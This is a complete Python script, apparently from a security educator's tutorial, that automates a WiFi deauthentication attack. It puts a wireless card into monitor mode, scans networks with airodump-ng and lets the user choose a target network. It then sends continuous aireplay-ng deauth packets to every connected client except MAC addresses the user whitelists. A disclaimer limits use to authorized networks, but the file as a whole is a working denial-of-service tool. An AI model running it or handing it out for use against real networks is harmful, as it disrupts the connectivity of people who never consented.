#!/usr/bin/env python3
# Disclaimer: 
# This script is for educational purposes only.  
# Do not use against any network that you don't own or have authorization to test.

#!/usr/bin/python3 

# We will be using the csv module to work with the data captured by airodump-ng.
import csv
# If we move csv files to a backup directory we will use the datetime module to create
# to create a timestamp in the file name.
from datetime import datetime
# We will use the os module to get the current working directory and to list filenames in a directory.
import os
# We will use the regular expressions module to find wifi interface name, and also MAC Addresses.
import re
# We will use methods from the shutil module to move files.
import shutil
# We can use the subprocess module to run operating system commands.
import subprocess
# We will create a thread for each deauth sent to a MAC so that enough time doesn't elapse to allow a device back on the network. 
import threading
# We use the sleep method in the menu.
import time


# Helper functions
def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()


def find_nic():
    """This function is used to find the network interface controllers on your computer."""
    # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    network_interface_controllers = wlan_code.findall(result)
    return network_interface_controllers


def set_monitor_mode(controller_name):
    """This function needs the network interface controller name to put it into monitor mode.
    Argument: Network Controller Name"""
    # Put WiFi controller into monitor mode.
    # This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    # Killing conflicting processes makes sure that nothing interferes with putting controller into monitor mode.
    subprocess.run(["airmon-ng", "check", "kill"])
    # Put the WiFi nic in monitor mode.
    subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
    # Bring the WiFi controller back online.
    subprocess.run(["ip", "link", "set", wifi_name, "up"])

def set_band_to_monitor(choice):
    """If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both."""
    if choice == "0":
        # Bands b and g are 2.4Ghz WiFi Networks
        subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif choice == "1":
        # Band a is for 5Ghz WiFi Networks
        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
    else:
        # Will use bands a, b and g (actually band n). Checks full spectrum.
        subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def backup_csv():
    """Move all .csv files in the directory to a new backup folder."""
    for file_name in os.listdir():
        # We should only have one csv file as we delete them from the folder every time we run the program.
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
            # We get the current working directory.
            directory = os.getcwd()
            try:
                # We make a new directory called /backup
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            # Create a timestamp
            timestamp = datetime.now()
            # We copy any .csv files in the folder to the backup folder.
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)


def check_for_essid(essid, lst):
    """Will check if there is an ESSID in the list and then send False to end the loop."""
    check_status = True

    # If no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if essid in item["ESSID"]:
            check_status = False

    return check_status


def wifi_networks_menu():
    """ Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c."""
    active_wireless_networks = list()
    try:
        while True:
            # We want to clear the screen before we print the network interfaces.
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                    # The following list contains the field names for the csv entries.
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                            # This creates a list of dictionaries with the keys as specified in the fieldnames.
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                elif row["BSSID"] == "Station MAC":
                                    break
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                # We're using the print statement with an f-string. 
                # F-strings are a more intuitive way to include variables when printing strings, 
                # rather than ugly concatenations.
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            # We make the script sleep for 1 second before loading the updated list.
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make choice.")
    
    # Ensure that the input choice is valid.
    while True:
        net_choice = input("Please select a choice from above: ")
        if active_wireless_networks[int(net_choice)]:
            return active_wireless_networks[int(net_choice)]
        print("Please try again.")



def set_into_managed_mode(wifi_name):
    """SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
       ARGUMENTS: wifi interface name 
    """
    # Put WiFi controller into monitor mode.
    # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    # Put the WiFi nic in monitor mode.
    subprocess.run(["iwconfig", wifi_name, "mode", "managed"])
    subprocess.run(["ip", "link", "set", wifi_name, "up"])
    subprocess.run(["service", "NetworkManager", "start"])


def get_clients(hackbssid, hackchannel, wifi_name):
    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth_attack(network_mac, target_mac, interface):
    # We are using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet.
    # Then we also need to specify the interface
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])


# Regular Expressions to be used.
mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
wlan_code = re.compile("Interface (wlan[0-9]+)")

# Program Header
# Basic user interface header
print(r"""______            _     _  ______                 _           _ 
|  _  \          (_)   | | | ___ \               | |         | |
| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
print("\n****************************************************************")
print("\n* Copyright of David Bombal, 2021                              *")
print("\n* https://www.davidbombal.com                                  *")
print("\n* https://www.youtube.com/davidbombal                          *")
print("\n****************************************************************")

# In Sudo Mode?
in_sudo_mode()
# Move any csv files to current working directory/backup
backup_csv()

# Lists to be populated
macs_not_to_kick_off = list()


# Menu to request Mac Addresses to be kept on network.
while True:
    print("Please enter the MAC Address(es) of the device(s) you don't want to kick off the network.")
    macs = input("Please use a comma separated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 :")
    # Use the MAC Address Regex to find all the MAC Addresses entered in the above input.
    macs_not_to_kick_off = mac_address_regex.findall(macs)
    # We reassign all the MAC address to the same variable as a list and make them uppercase using a list comprehension.
    macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
    # If you entered a valid MAC Address the program flow will continue and break out of the while loop.
    if len(macs_not_to_kick_off) > 0:
        break
    
    print("You didn't enter valid Mac Addresses.")


# Menu to ask which bands to scan with airmon-ng
while True:
    wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
    print("Please select the type of scan you want to run.")
    for index, controller in enumerate(wifi_controller_bands):
        print(f"{index} - {controller}")
    

    # Check if the choice exists. If it doesn't it asks the user to try again.
    # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
    band_choice = input("Please select the bands you want to scan from the list above: ")
    try:
        if wifi_controller_bands[int(band_choice)]:
            # Since the choice exists and is an integer we can cast band choice as an integer.
            band_choice = int(band_choice)
            break
    except:
        print("Please make a valid selection.")


# Find all the network interface controllers.
network_controllers = find_nic()
if len(network_controllers) == 0:
    # If no networks interface controllers connected to your computer the program will exit.
    print("Please connect a network interface controller and try again!")
    exit()


# Select the network interface controller you want to put into monitor mode.
while True:
    for index, controller in enumerate(network_controllers):
        print(f"{index} - {controller}")
    
    controller_choice = input("Please select the controller you want to put into monitor mode: ")

    try:
        if network_controllers[int(controller_choice)]:
            break
    except:
        print("Please make a valid selection!")


# Assign the network interface controller name to a variable for easy use.
wifi_name = network_controllers[int(controller_choice)]


# Set network interface controller to monitor mode.
set_monitor_mode(wifi_name)
# Monitor the selected wifi band(s).
set_band_to_monitor(band_choice)
# Print WiFi Menu
wifi_network_choice = wifi_networks_menu()
hackbssid = wifi_network_choice["BSSID"]
# We strip out all the extra white space to just get the channel.
hackchannel = wifi_network_choice["channel"].strip()
# backup_csv()
# Run against only the network we want to kick clients off.
get_clients(hackbssid, hackchannel, wifi_name)

# We define a set, because it can only hold unique values.
active_clients = set()
# We would like to know the threads we've already started so that we don't start multiple threads running the same deauth.
threads_started = []

# Make sure that airmon-ng is running on the correct channel.
subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
try:
    while True:
        count = 0

        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
            # The following list contains the field names for the csv entries.
            fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
            if ".csv" in file_name and file_name.startswith("clients"):
                with open(file_name) as csv_h:
                    print("Running")
                    # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                    # This creates a list of dictionaries with the keys as specified in the fieldnames.
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for index, row in enumerate(csv_reader):
                        if index < 5:
                            pass
                        # We will not add the MAC Addresses we specified at the beginning of the program to the ones we will kick off.
                        elif row["Station MAC"] in macs_not_to_kick_off:
                            pass
                        else:
                        # Add all the active MAC Addresses.
                            active_clients.add(row["Station MAC"])
            
            print("Station MAC           |")
            print("______________________|")
            for item in active_clients:
                # We're using the print statement with an f-string. 
                # F-strings are a more intuitive way to include variables when printing strings, 
                # rather than ugly concatenations.
                print(f"{item}")
                # Once a device is in the active clients set and not one of the threads running deauth attacks we start a new thread as a deauth attack.
                if item not in threads_started:
                    # It's easier to work with the unique MAC Addresses in a list and add the MAC to the list of threads we started before we start running the deauth thread.
                    threads_started.append(item)
                    # We run the deauth_attack function in the thread with the argumenets hackbssid, item and wifi_name, we also specify it as a background daemon thread.
                    # A daemon thread keeps running until the main thread stops. You can stop the main thread with ctrl + c.
                    t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
                    t.start()
except KeyboardInterrupt:
    print("\nStopping Deauth")

# Set the network interface controller back into managed mode and restart network services. 
set_into_managed_mode(wifi_name)
